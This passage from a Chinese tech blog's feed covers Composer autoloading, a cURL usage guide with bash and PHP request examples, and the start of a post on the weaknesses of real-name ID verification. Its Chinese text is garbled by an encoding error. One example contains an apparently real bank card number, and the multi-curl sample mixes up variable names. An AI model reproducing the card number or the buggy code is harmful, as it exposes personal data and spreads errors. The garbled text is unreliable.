<span class="string">"laravel/framework"</span>: <span class="string">"^6.2"</span>,</span><br><span class="line">        <span class="string">"laravel/tinker"</span>: <span class="string">"^2.0"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"require-dev"</span>: &#123;</span><br><span class="line">        <span class="string">"facade/ignition"</span>: <span class="string">"^1.4"</span>,</span><br><span class="line">        <span class="string">"fzaninotto/faker"</span>: <span class="string">"^1.9.1"</span>,</span><br><span class="line">        <span class="string">"mockery/mockery"</span>: <span class="string">"^1.0"</span>,</span><br><span class="line">        <span class="string">"nunomaduro/collision"</span>: <span class="string">"^3.0"</span>,</span><br><span class="line">        <span class="string">"phpunit/phpunit"</span>: <span class="string">"^8.0"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"config"</span>: &#123;</span><br><span class="line">        <span class="string">"optimize-autoloader"</span>: <span class="keyword">true</span>,</span><br><span class="line">        <span class="string">"preferred-install"</span>: <span class="string">"dist"</span>,</span><br><span class="line">        <span class="string">"sort-packages"</span>: <span class="keyword">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"extra"</span>: &#123;</span><br><span class="line">        <span class="string">"laravel"</span>: &#123;</span><br><span class="line">            <span class="string">"dont-discover"</span>: []</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"autoload"</span>: &#123;</span><br><span class="line">        <span class="string">"psr-4"</span>: &#123;</span><br><span class="line">            <span class="string">"App\\"</span>: <span class="string">"app/"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"classmap"</span>: [</span><br><span class="line">            <span class="string">"database/seeds"</span>,</span><br><span class="line">            <span class="string">"database/factories"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">"files"</span>: [</span><br><span class="line">            <span class="string">"src/Illuminate/Foundation/helpers.php"</span>,</span><br><span class="line">            <span class="string">"src/Illuminate/Support/helpers.php"</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"autoload-dev"</span>: &#123;</span><br><span class="line">        <span class="string">"psr-4"</span>: &#123;</span><br><span class="line">            <span class="string">"Tests\\"</span>: <span class="string">"tests/"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"minimum-stability"</span>: <span class="string">"dev"</span>,</span><br><span class="line">    <span class="string">"prefer-stable"</span>: <span class="keyword">true</span>,</span><br><span class="line">    <span class="string">"scripts"</span>: &#123;</span><br><span class="line">        <span class="string">"post-autoload-dump"</span>: [</span><br><span class="line">            <span class="string">"Illuminate\\Foundation\\ComposerScripts::postAutoloadDump"</span>,</span><br><span class="line">            <span class="string">"@php artisan package:discover --ansi"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">"post-root-package-install"</span>: [</span><br><span class="line">            <span class="string">"@php -r \"file_exists('.env') || copy('.env.example', '.env');\""</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">"post-create-project-cmd"</span>: [</span><br><span class="line">            <span class="string">"@php artisan key:generate --ansi"</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>composer.json</code>ä¸­çš„<code>classmap</code>å­—æ®µä¼šæ‰«ææŒ‡å®šç›®å½•ä¸­çš„æ‰€æœ‰<code>.php</code>å’Œ<code>.inc</code>æ–‡ä»¶ï¼Œå¹¶åŠ è½½åˆ°<code>vendor/composer/autoload_classmap.php</code>æ–‡ä»¶ä¸­ï¼Œåœ¨è¯¥æ–‡ä»¶ä¸­ä¼šå®ç°ä¸€ä¸ªå…·ä½“ç±»ä¸æ–‡ä»¶æ˜ å°„çš„å…³è”æ•°ç»„ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ç²¾ç¡®æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ã€‚é€šè¿‡ classmap å¯ä»¥ç”Ÿæˆä¸éµå¾ª PSR-0 å’Œ PSR-4 è§„èŒƒçš„è‡ªåŠ¨åŠ è½½ç±»åº“ã€‚</p><p>å¯¹äºæ¯æ¬¡åœ¨ç¨‹åºæ‰§è¡Œæ—¶éƒ½éœ€è¦è½½å…¥çš„æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡ files è§„èŒƒå®ç°è‡ªåŠ¨åŠ è½½ï¼Œé€šå¸¸ç»å¸¸ä½¿ç”¨çš„å‡½æ•°åº“æ–‡ä»¶å°±ä½¿ç”¨è¿™ç§è½½å…¥æ–¹å¼ï¼Œå¦‚ helpers å‡½æ•°æ–‡ä»¶ã€‚</p><h2 id="composer-ç”Ÿæˆç±»çš„è‡ªåŠ¨åŠ è½½å‡½æ•°çš„å®ç°"><a href="#composer-ç”Ÿæˆç±»çš„è‡ªåŠ¨åŠ è½½å‡½æ•°çš„å®ç°" class="headerlink" title="composer ç”Ÿæˆç±»çš„è‡ªåŠ¨åŠ è½½å‡½æ•°çš„å®ç°"></a>composer ç”Ÿæˆç±»çš„è‡ªåŠ¨åŠ è½½å‡½æ•°çš„å®ç°</h2><p>ç±»çš„è‡ªåŠ¨åŠ è½½å¯ä»¥é€šè¿‡é­”æœ¯æ–¹æ³•<code>__autoload(string $class)</code>å®ç°ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å‡½æ•°<code>spl_autoload_register</code>æ³¨å†Œä¸€ä¸ªè‡ªåŠ¨åŠ è½½æ–¹æ³•ã€‚<code>__autoload()</code>é­”æœ¯æ–¹æ³•åªèƒ½å®šä¹‰ä¸€æ¬¡ï¼Œè€Œ<code>spl_autoload_register</code>åˆ™å¯ä»¥å°†å¤šä¸ªç±»è‡ªåŠ¨åŠ è½½æ–¹æ³•æ³¨å†Œåˆ°é˜Ÿåˆ—ä¸­ã€‚é€šè¿‡<code>spl_autoload_register()</code>å‡½æ•°åŠ è½½çš„è‡ªåŠ¨åŠ è½½å‡½æ•°å¯ä»¥æ˜¯å…¨å±€å‡½æ•°ï¼Œä¹Ÿå¯ä»¥æ˜¯æŸä¸ªç±»å®ä¾‹å¯¹è±¡çš„å‡½æ•°ï¼Œå³é€šè¿‡ array(å¯¹è±¡åï¼Œå‡½æ•°å) æ³¨å†Œã€‚</p><p>é€šè¿‡composer å·¥å…·åˆ›å»ºä¾èµ–ç®¡ç†æ—¶ï¼Œä¼šåœ¨ vendor ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª<code>autoload.php</code>æ–‡ä»¶å’Œä¸€ä¸ªcomposeræ–‡ä»¶å¤¹ï¼Œå…¶ä¸­composeræ–‡ä»¶å¤¹ä¸­åŒ…å«äº†ç±»è‡ªåŠ¨åŠ è½½å‡½æ•°æ³¨å†Œçš„ç›¸å…³å®ç°ï¼Œè€Œ<code>autoload.php</code>æ–‡ä»¶æ˜¯å¯¹å¤–æä¾›çš„æ¥å£ï¼Œé€šè¿‡åŒ…å«è¯¥æ–‡ä»¶å°±å¯ä»¥å®Œæˆç±»è‡ªåŠ¨åŠ è½½å‡½æ•°çš„æ³¨å†Œã€‚é€šè¿‡å…¶ä¸­çš„ä»£ç å¯ä»¥çœ‹åˆ°, <code>autoload.php</code> æ–‡ä»¶åŒ…å«äº†composerç›®å½•ä¸‹çš„<code>autoload_real.php</code> æ–‡ä»¶,è€Œ<code>autoload_real.php</code> æ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªç±»ï¼Œè¯¥ç±»ç”±æœ«å°¾æœ‰ä¸€ä¸²æ•°å­—çš„æ–¹å¼å®šä¹‰ï¼Œå¹¶ä¸”å®šä¹‰äº†<code>getLoader()</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°é¦–å…ˆå®ä¾‹åŒ–<code>Composer\Autoload\ClassLoader</code>ç±»ï¼Œç„¶åé€šè¿‡è¯¥ç±»å®ä¾‹æ·»åŠ ç›¸å…³çš„æ–‡ä»¶è·¯å¾„é…ç½®ï¼ŒåŒ…æ‹¬å‘½åç©ºé—´(<code>autoload_namespaces.php</code> æ–‡ä»¶å®šä¹‰)é…ç½®ã€PSR-4è§„èŒƒ(<code>autoload_psr4.php</code> æ–‡ä»¶å®šä¹‰)é…ç½®ã€ç±»æ˜ å°„(<code>autoload_classmap.php</code> æ–‡ä»¶å®šä¹‰)é…ç½®,æ¥ç€è°ƒç”¨<code>$loader-&gt;register(true)</code>æ³¨å†Œç±»è‡ªåŠ¨åŠ è½½å‡½æ•°ï¼Œæœ€ååŠ è½½å…¨å±€æ–‡ä»¶ï¼Œå³åœ¨<code>autoload_files.php</code>æ–‡ä»¶ä¸­é…ç½®çš„å†…å®¹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> composer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cURL ä½¿ç”¨æŒ‡å—</title>
      <link href="/post/curl-guide/"/>
      <url>/post/curl-guide/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006tNbRwly1g9idtepi63j30xc0crjsf.jpg" alt=""></p><a id="more"></a><h1 id="ç»ˆç«¯"><a href="#ç»ˆç«¯" class="headerlink" title="ç»ˆç«¯"></a>ç»ˆç«¯</h1><blockquote><p>æˆ‘ä»¬å¯ä»¥åœ¨<a href="https://curl.haxx.se/docs/manpage.html" target="_blank" rel="noopener">è¿™é‡Œ</a>æŸ¥çœ‹åˆ°æ›´å¤šå…³äº curl å‘½ä»¤çš„å‚æ•°è§£é‡Šï¼Œæœ¬æ–‡ä»…è¦†ç›–æ—¥å¸¸çš„ä¸€äº›ä½¿ç”¨åœºæ™¯ã€‚</p></blockquote><h2 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h2><p>å¦‚æœè¦å‘èµ·ç®€å•çš„ GET è¯·æ±‚ï¼Œåªéœ€ç›´æ¥è¯·æ±‚åœ°å€å³å¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl https://cn.bing.com/HPImageArchive.aspx\?format\=js\&amp;idx\=0\&amp;n\=1\&amp;nc\=1572500909531\&amp;pid\=hp\&amp;FORM\=BEHPTB\&amp;video\=1 | jq</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨<code>jq</code>æ¥ä½¿ json æ•°æ®åœ¨ç»ˆç«¯æ ¼å¼åŒ–å±•ç¤ºã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9iegxw00oj317i0u0458.jpg" alt=""></p><h2 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h2><h3 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h3><table><thead><tr><th>å‚æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>-o</code></td><td>å°†ç»“æœå†™å…¥æŒ‡å®šæ–‡ä»¶</td></tr><tr><td><code>-O</code></td><td>ç›´æ¥ä»¥è¿œç¨‹æ–‡ä»¶åä¿å­˜åˆ°æœ¬åœ°</td></tr><tr><td><code>-#</code></td><td>æ˜¾ç¤ºä¸‹è½½è¿›åº¦æ¡</td></tr><tr><td><code>-s</code></td><td>å°†ç»ˆç«¯çš„è¾“å‡ºå…³é—­</td></tr><tr><td><code>-v</code></td><td>è¾“å‡ºè¯¦ç»†çš„è¯·æ±‚</td></tr><tr><td><code>-C</code></td><td>æ–­ç‚¹ç»­ä¼ </td></tr><tr><td><code>â€“limit-rate</code></td><td>è®¾ç½®ä¼ è¾“é€Ÿåº¦ï¼ˆé»˜è®¤å•ä½ä¸º B/sï¼Œæ‰‹åŠ¨æ·»åŠ  <code>k</code>ï¼Œ<code>m</code>ï¼Œ<code>g</code> æŒ‡å®šå•ä½ï¼‰</td></tr><tr><td><code>â€“retry 5</code></td><td>ä¼ è¾“å‡ºç°é—®é¢˜æ—¶ï¼Œé‡è¯• 5 æ¬¡</td></tr><tr><td><code>â€“retry-delay</code></td><td>ä¼ è¾“å‡ºç°é—®é¢˜æ—¶ï¼Œè®¾ç½®é‡è¯•æ—¶é—´é—´éš” (ç§’)</td></tr><tr><td><code>â€“retry-max-time</code></td><td>ä¼ è¾“å‡ºç°é—®é¢˜æ—¶ï¼Œè®¾ç½®æœ€å¤§é‡è¯•æ—¶é—´</td></tr><tr><td><code>-m</code></td><td>è®¾ç½®æœ€å¤§ä¼ è¾“æ—¶é—´ï¼Œå•ä½ç§’</td></tr></tbody></table><p>ä¿å­˜ç»“æœ<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9ifve2phnj30zy04smxr.jpg" alt="ä¿å­˜ç»“æœ"></p><p>è¾“å‡ºè¯¦ç»†è¯·æ±‚ä¿¡æ¯<br><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9ifu88t6mj316m0pcq6l.jpg" alt="è¾“å‡ºè¯¦ç»†è¯·æ±‚è¿‡ç¨‹"></p><h3 id="è¯·æ±‚"><a href="#è¯·æ±‚" class="headerlink" title="è¯·æ±‚"></a>è¯·æ±‚</h3><table><thead><tr><th>å‚æ•°</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>-H</code></td><td>è®¾å®š header ä¿¡æ¯</td></tr><tr><td><code>-d/--data</code></td><td>å¯¹åº”<code>Content-Type:application/x-www-form-urlencoded</code></td></tr><tr><td><code>-F</code></td><td>å¯¹åº”<code>Content-Type:multipart/form-data</code>ï¼Œå¯ç”¨äºæŒ‡å®šä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„</td></tr><tr><td><code>-G</code></td><td>ä½¿ç”¨ GET æ–¹å¼å‘é€æ•°æ®</td></tr><tr><td><code>-I</code></td><td>åªæ˜¾ç¤ºè¯·æ±‚å¤´ä¿¡æ¯</td></tr><tr><td><code>-x</code></td><td>ä½¿ç”¨ http ä»£ç†</td></tr><tr><td><code>-A</code></td><td>è®¾ç½® <code>User-Agent</code> ä¿¡æ¯</td></tr><tr><td><code>-e</code></td><td>è®¾ç½® <code>Referer</code> ä¿¡æ¯</td></tr><tr><td><code>--cookie</code></td><td>è®¾ç½® cookie ä¿¡æ¯ï¼Œå¤šä¸ª cookie ç”¨åˆ†å·åˆ†éš”ï¼Œåˆ†å·åå¸¦ä¸€ä¸ªç©ºæ ¼</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">'https://open.unionpay.com/tjwx/api/cardbin/cardinfo'</span> \</span><br><span class="line">-H <span class="string">'Content-Type:application/x-www-form-urlencoded'</span> \</span><br><span class="line">-H <span class="string">'Accept:application/json, text/javascript, */*; q=0.01'</span> \</span><br><span class="line">-e <span class="string">'https://open.unionpay.com/tjwx/openapi/cardbin-pc.html'</span> \</span><br><span class="line">-A <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36'</span> \</span><br><span class="line">-d <span class="string">'cardNo=6227000280070859140'</span> \</span><br><span class="line">--cookie <span class="string">'fruit=apple; colour=red'</span> \</span><br><span class="line">-s \</span><br><span class="line">| jq</span><br></pre></td></tr></table></figure><p>æœ€åï¼Œå¦‚æœæœ¬åœ°æ²¡æœ‰å®‰è£… Postman ç­‰å›¾å½¢åŒ–è¯·æ±‚å·¥å…·ï¼Œè¿˜å¯ä»¥ç›´æ¥æ‰“å¼€æµè§ˆå™¨çš„æ§åˆ¶å°ï¼Œè·å–åˆ°æŸæ¬¡ç½‘ç»œçš„ curl å½¢å¼ï¼Œè¿™æ ·åœ¨è°ƒè¯•æŸäº›é¡µé¢è¯·æ±‚æˆ–è€…å¿˜è®° curl çš„è¯·æ±‚æ ¼å¼æ—¶å¯ä»¥ç”¨åˆ°ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9ieuom1jgj30ek0ca45m.jpg" alt=""></p><p>æ›´å¤šç»ˆç«¯ä½¿ç”¨æ•™ç¨‹è¯·æŸ¥çœ‹<a href="https://curl.haxx.se/docs/manual.html" target="_blank" rel="noopener">curl tutorial</a></p><p>è¿˜æœ‰ä¸€ä¸ªç»ˆç«¯ HTTP è¯·æ±‚å·¥å…·<a href="https://httpie.org/" target="_blank" rel="noopener">HTTPie</a>ä¼šæ¯” curl æ›´åŠ å‹å¥½ï¼Œæ”¯æŒè‡ªåŠ¨ json æ ¼å¼åŒ–ï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹ã€‚</p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="GET-1"><a href="#GET-1" class="headerlink" title="GET"></a>GET</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">'https://cn.bing.com/HPImageArchive.aspx?'</span>;</span><br><span class="line">$query = http_build_query([</span><br><span class="line">    <span class="string">'format'</span> =&gt; <span class="string">'js'</span>,</span><br><span class="line">    <span class="string">'idx'</span>    =&gt; <span class="number">0</span>,</span><br><span class="line">    <span class="string">'n'</span>      =&gt; <span class="number">1</span>,</span><br><span class="line">    <span class="string">'nc'</span>     =&gt; <span class="number">1572500909531</span>,</span><br><span class="line">    <span class="string">'pid'</span>    =&gt; <span class="string">'hp'</span>,</span><br><span class="line">    <span class="string">'FORM'</span>   =&gt; <span class="string">'BEHPTB'</span>,</span><br><span class="line">    <span class="string">'video'</span>  =&gt; <span class="number">1</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$ch = curl_init($url . $query);</span><br><span class="line"></span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$res = curl_exec($ch);</span><br><span class="line"></span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure><p>é€šå¸¸ï¼Œä¸€ä¸ªç®€å•çš„ GET è¯·æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>file_get_contents()</code>æ›´å¿«é€Ÿçš„è·å–ç»“æœã€‚</p><h2 id="POST-1"><a href="#POST-1" class="headerlink" title="POST"></a>POST</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ch = curl_init(<span class="string">'https://open.unionpay.com/tjwx/api/cardbin/cardinfo'</span>);</span><br><span class="line"></span><br><span class="line">curl_setopt_array(</span><br><span class="line">    $ch,</span><br><span class="line">    [</span><br><span class="line">        CURLOPT_POST           =&gt; <span class="keyword">true</span>,</span><br><span class="line">        CURLOPT_POSTFIELDS     =&gt; http_build_query([<span class="string">'cardNo'</span> =&gt; $cardNo]),<span class="comment">//è®¾å®š POST å‚æ•°å†…å®¹</span></span><br><span class="line">        CURLOPT_FOLLOWLOCATION =&gt; <span class="keyword">true</span>,<span class="comment">//è·Ÿéšé‡å®šå‘åœ°å€</span></span><br><span class="line">        CURLOPT_AUTOREFERER    =&gt; <span class="keyword">true</span>,</span><br><span class="line">        CURLOPT_RETURNTRANSFER =&gt; <span class="keyword">true</span>,<span class="comment">//å°†curl_exec()è·å–çš„ä¿¡æ¯ä»¥å­—ç¬¦ä¸²è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡ºã€‚</span></span><br><span class="line">        CURLOPT_USERAGENT      =&gt; <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'</span>,</span><br><span class="line">        CURLOPT_REFERER        =&gt; <span class="string">'https://open.unionpay.com/tjwx/openapi/cardbin-pc.html'</span>,<span class="comment">//å¿…å¡«é¡¹</span></span><br><span class="line">        CURLOPT_HTTPHEADER     =&gt; [<span class="string">"Content-Type: application/x-www-form-urlencoded"</span>, <span class="string">"Accept: application/json, text/javascript, */*; q=0.01"</span>]</span><br><span class="line">    ]</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$response = curl_exec($ch);</span><br><span class="line"></span><br><span class="line">curl_close($ch);</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„å‡ ç‚¹ï¼š</p><ol><li><code>curl_setopt_array</code>ä¸­çš„ç¬¬äºŒä¸ªå‚æ•°çš„ key ä¸ºé¢„è®¾å¸¸é‡ï¼Œä¸è¦å†™ä½œå­—ç¬¦ä¸²</li><li>è‹¥æœªè®¾ç½®<code>CURLOPT_RETURNTRANSFER = true</code>ï¼Œåˆ™ curl ä¼šé»˜è®¤è¾“å‡ºç»“æœï¼Œè¿™ä¸ªé—®é¢˜æˆ‘è°ƒäº†ä¸€ä¸ªä¸‹åˆğŸ˜…</li><li>åœ¨è°ƒç”¨ curl ç»“æŸåï¼Œè®°å¾—è°ƒç”¨<code>curl_close()</code>å…³é—­å¥æŸ„ï¼Œä¸ºäº†é˜²æ­¢é—å¿˜ï¼Œå»ºè®®<code>curl_init()</code>ä¸<code>curl_close()</code>æˆå¯¹åˆ›å»º</li><li>å¦‚æœæœ‰å¤šä¸ªäº’ä¸ä¾èµ–çš„è¯·æ±‚ï¼Œå¯ä»¥ä½¿ç”¨<code>curl_multi</code>æ¥æå‡åŠ è½½é€Ÿåº¦ï¼Œä½¿ç”¨<a href="https://www.php.net/manual/zh/function.curl-multi-init.php#118142" target="_blank" rel="noopener">ç¤ºä¾‹</a>å¦‚ä¸‹</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// build the individual requests, but do not execute them</span></span><br><span class="line">$ch_1 = curl_init(<span class="string">'http://webservice.one.com/'</span>);</span><br><span class="line">$ch_2 = curl_init(<span class="string">'http://webservice.two.com/'</span>);</span><br><span class="line">curl_setopt($ch_1, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">curl_setopt($ch_2, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// build the multi-curl handle, adding both $ch</span></span><br><span class="line">$mh = curl_multi_init();</span><br><span class="line">curl_multi_add_handle($mh, $ch_1);</span><br><span class="line">curl_multi_add_handle($mh, $ch_2);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// execute all queries simultaneously, and continue when all are complete</span></span><br><span class="line">  $running = <span class="keyword">null</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    curl_multi_exec($mh, $running);</span><br><span class="line">  &#125; <span class="keyword">while</span> ($running);</span><br><span class="line"></span><br><span class="line"><span class="comment">//close the handles</span></span><br><span class="line">curl_multi_remove_handle($mh, $ch1);</span><br><span class="line">curl_multi_remove_handle($mh, $ch2);</span><br><span class="line">curl_multi_close($mh);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// all of our requests are done, we can now access the results</span></span><br><span class="line">$response_1 = curl_multi_getcontent($ch_1);</span><br><span class="line">$response_2 = curl_multi_getcontent($ch_2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"$response_1 $response_2"</span>; <span class="comment">// output results</span></span><br></pre></td></tr></table></figure><p>æ›´å¤šè¯·æ±‚å‚æ•°è®¾ç½®è¯·ç‚¹å‡»<a href="https://www.php.net/manual/zh/function.curl-setopt.php" target="_blank" rel="noopener">curl_setop</a>æŸ¥çœ‹ã€‚</p><hr><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ol><li><a href="https://curl.haxx.se/" target="_blank" rel="noopener">cURL - Offical Website</a></li><li><a href="https://www.php.net/manual/zh/book.curl.php" target="_blank" rel="noopener">Client URL åº“ - PHP Manual</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸æŠ€æœ¯ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å®åè®¤è¯å˜è¿</title>
      <link href="/post/real-name-authentication/"/>
      <url>/post/real-name-authentication/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/006y8mN6ly1g9afgrs3mbj30go0bgjse.jpg" alt=""></p><a id="more"></a><h1 id="å®åè®¤è¯æ–¹å¼"><a href="#å®åè®¤è¯æ–¹å¼" class="headerlink" title="å®åè®¤è¯æ–¹å¼"></a>å®åè®¤è¯æ–¹å¼</h1><h2 id="1-å§“å-èº«ä»½è¯å·-å…¬å®‰ç³»ç»Ÿæ¥å£"><a href="#1-å§“å-èº«ä»½è¯å·-å…¬å®‰ç³»ç»Ÿæ¥å£" class="headerlink" title="1. å§“å + èº«ä»½è¯å· + å…¬å®‰ç³»ç»Ÿæ¥å£"></a>1. å§“å + èº«ä»½è¯å· + å…¬å®‰ç³»ç»Ÿæ¥å£</h2><p>è¿™æ˜¯æœ€åŸå§‹çš„è®¤è¯æ–¹å¼ï¼Œç¼ºç‚¹å¾ˆæ˜æ˜¾ï¼š</p><ul><li>éœ€è¦å…·å¤‡è°ƒç”¨å…¬å®‰ç³»ç»Ÿå…¬æ°‘ä¿¡æ¯æ¥å£çš„èµ„è´¨</li><li>æ— æ³•ä¿è¯è¢«è®¤è¯è€…çš„çœŸå®æ€§ã€‚æ¯”å¦‚æˆ‘åœ¨é»‘å¸‚ä¸¤å…ƒé’±è´­ä¹°äº†ä¸€å¼ èº«ä»½è¯ï¼Œè¿™ä¸ªèº«ä»½è¯çš„ä¿¡æ¯æ˜¯çœŸå®æœ‰æ•ˆçš„ï¼Œä½†ä½¿ç”¨è€…å´ä¸æ˜¯æœ¬äººã€‚è¿™ç§èº«ä»½è¯ä¿¡æ¯å¯èƒ½æ˜¯èº«ä»½è¯ä¸¢å¤±ï¼Œä¹Ÿå¯èƒ½æ˜¯æœ‰äººä¸“é—¨ç”¨ä¸é”ˆé’¢è„¸ç›†åœ¨å†œæ‘éª—å–æ‘æ°‘çš„èº«ä»½è¯ä¿¡æ¯ï¼Œç”šè‡³ä¼šè¯±ä½¿ä»–ä»¬æ‹ä¸‹æ‰‹æŒèº«ä»½è¯çš„ç…§ç‰‡ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯æ—©å¹´æ·±åœ³ä¸‰å’Œäººæ‰å¸‚åœºçš„è½é­„è€…å‡ºå”®èº«ä»½è¯è€Œæ¥ã€‚</li></ul><h2 id="2-å§“å-èº«ä»½è¯å·-æ‰‹æŒèº«ä»½è¯ç…§ç‰‡"><a href="#2-å§“å-èº«ä»½è¯å·-æ‰‹æŒèº«ä»½è¯ç…§ç‰‡" class="headerlink" title="2. å§“å + èº«ä»½è¯å· + æ‰‹æŒèº«ä»½è¯ç…§ç‰‡"></a>2. å§“å + èº«ä»½è¯å· + æ‰‹æŒèº«ä»½è¯ç…§ç‰‡</h2><p>é‰´äºç¬¬ä¸€ç§æ–¹å¼å¯èƒ½ä¼šå‡ºç°å†’ç”¨çš„æƒ…å†µï¼Œå› æ­¤åæ¥å‡ºç°äº†æ‰‹æŒèº«ä»½è¯éªŒè¯æœ¬äººçš„è®¤è¯æ–¹å¼ã€‚ä½†è¿™ç§æ–¹å¼åŒæ ·å­˜åœ¨å¾ˆå¤§çš„æ¼æ´ï¼šæˆ‘ç›´æ¥è¯±ä½¿æœ¬äººæ‹ä¸‹æ‰‹æŒèº«ä»½è¯çš„ç…§ç‰‡ï¼Œæˆ–è€…ä½¿ç”¨ Photoshop ä¿®æ”¹èº«ä»½è¯ç…§ç‰‡æˆ–è€…æ‰‹æŒè€…ç…§ç‰‡ï¼Œä½¿äºŒè€…ä¸€è‡´ï¼ŒåŒæ ·å¯ä»¥è½»æ˜“ç»•è¿‡ã€‚</p><h2 id="3-ç»‘å®šé“¶è¡Œå¡"><a href="#3-ç»‘å®šé“¶è¡Œå¡" class="headerlink" title="3. ç»‘å®šé“¶è¡Œå¡"></a>3. 